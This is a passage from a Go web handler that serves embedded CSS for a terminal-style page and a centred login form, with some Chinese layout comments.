                    margin-left: 5px;
                }
                .prompt {
                    color: #000;
                    display: inline-block;
                    width: 30px;
                    font-size: 12px;
                }
                .input-container {
                    margin-top: 10px;
                }
                .output {
                    white-space: pre-wrap;
                    margin: 5px 0;
                    font-size: 12px;
                }
                .form-in {
                    background-color: #ffffff;
                    padding: 30px; 
                    border-radius: 10px;
                    box-shadow: 0px 4px 15px rgba(0, 0, 0, 0.2); 
                    width: 300px;
                    height: auto; 
                    display: flex;
                    flex-direction: column;
                    align-items: center;
                    justify-content: center;
                     /* 绝对定位 */
                     position: absolute;
                     top: 50%; /* 距离页面顶部 50% */
                     left: 50%; /* 距离页面左侧 50% */
                     transform: translate(-50%, -50%); /* 使用 transform 来居中 */
                }
                .form-in input[type="text"],
                .form-in input[type="password"] {
                    width: 100%; 
                    padding: 10px; /* 增加内边距 */
                    margin: 10px 0; /* 增加垂直方向的间距 */
                    border-radius: 5px; /* 设置输入框的圆角 */
                    border: 1px solid #ccc; /* 边框颜色 */
                    font-size: 16px; /* 设置字体大小 */
                    box-sizing: border-box; /* 包含内边距和边框 */
                }
                .form-in button {
                    width: 100%; 
                    padding: 10px; /* 增加内边距 */
                    background-color: #ffaec6; 
                    color: white; /* 按钮文字颜色 */
                    border: none;
                    border-radius: 5px;
                    font-size: 16px; /* 字体大小 */
                    cursor: pointer; 
                    margin-top: 10px; /* 按钮与输入框之间的间距 */
                    transition: background-color 0.3s ease; /* 添加平滑过渡效果 */
                }
                .form-in button:hover {
                    background-color: #ff75ba; /* 悬停时的背景颜色 */
                }
                .form-in h1 {
                    font-size: 24px; /* 设置标题的字体大小 */
                    margin-bottom: 20px; /* 标题与输入框之间的间距 */
                    color: #333; /* 标题颜色 */
                }`
        }
        w.Header().Set("Content-Type", "text/css")
        fmt.Fprint(w, cssContent)
        }
    }
}